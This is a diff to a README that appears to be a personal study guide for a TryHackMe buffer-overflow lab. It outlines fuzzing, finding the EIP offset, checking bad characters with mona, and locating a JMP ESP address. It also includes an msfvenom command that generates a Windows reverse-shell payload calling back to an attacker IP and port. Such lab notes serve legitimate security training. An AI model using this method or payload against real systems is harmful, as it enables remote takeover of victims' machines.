@@ -10,15 +10,14 @@ More details and step by step can be bound here:
 https://jensoroger.wordpress.com/2021/01/19/explain-in-my-own-way-how-to-do-basic-buffer-overflow-with-help-from-realtryhackme-bufferoverlow-hacking-infosec-linux4hackers-pentest-pentesting-redteam/
 
 ## Step 1 General about fuzzing
-The Goal here is to crash tha application and make the application execute "our" that we decide.
-You need to know how the application works, are login first and the something else that we want to fuzz (crash).
+The goal here is to crash the application and make the application execute "our" code that we decide. You need to know how the application works, are login first and the something else that we want to fuzz (crash).
 
 ## Step 2 Finding the offset
-The goal here is to get control of EIP int the stack, for that to happend we need to find the offset. 
+The goal here is to get control of EIP in the stack, for that to happend we need to find the offset. 
 
 ### Step 2.1 (fuzz.py)
 Crash the application with fuzz.py and see if EIP contains AAAA.
-What is needed in the script. 
+What is needed are in the script. 
 ip, port, string
 
 We also need to verify with ex. Immunity Debugger that EIP contains AAAA
@@ -33,7 +32,7 @@ ip, port, overflow, payload (random data), buffer
 Immunity Debugger and mona are used for this
 
 ### Step 2.2 Verify the offset (payload2.py)
-Here we just verify that all is correct
+Here we just verify that all is correct. The EIP shall contain AAAA
 
 ip, port, offsett, retn, payload, buffer, 
 
@@ -48,15 +47,14 @@ Immunity Debugger and mona are used for this
 
 !mona compare -f C:\mona\oscp\bytearray.bin -a "ESP"
 
- Message=Possibly bad chars: 01 02 03 04
-
+ Message=Possibly bad chars: 02 04
 
 ## Step 3.1 Find characters minus 3.1 founded  characters (payload3.py edited)
 ip, port, offsett, retn, payload = bad charachter, buffer
 
 Immunity Debugger and mona are used for this
 
-!mona bytearray -b "\x00\x01"
+!mona bytearray -b "\x00\x02\x04"
 
 !mona compare -f C:\mona\"procename"bytearray.bin -a "ESP"
 
@@ -64,8 +62,8 @@ Do this until you have Unmodified
 
 ## Step 4 Finding jump adress (payload3.py)
 In mona after step 3 and add the bad characters that you find.
-!mona jmp -r esp -cpb "\x00"
-Choose a nice adress in the list
+!mona jmp -r esp -cpb "\x00\x02\x04"
+Choose a nice adress in the list, if it do not work at the first time try one more in the list.
 
 ## Step 5 Creating the payload (payload4.py)
 ip, port, offsett, retn, payload = buf, padding, buffer
@@ -80,8 +78,8 @@ LHOST=Your attacker box IP
 LPORT=What port will the victim use to connect to your attack box
 -b= That is the bad characters that you will find in step 3
 -f=The output will be in pyton, so we can add this payload to the script.
-msfvenom -p windows/shell_reverse_tcp LHOST=172.21.21.34 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
 
+msfvenom -p windows/shell_reverse_tcp LHOST=172.21.21.34 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
 
 ## Brainstorm from tryhackme
 The main thing in this BoF was that the first thing that happens when you connect to the application on port 9999
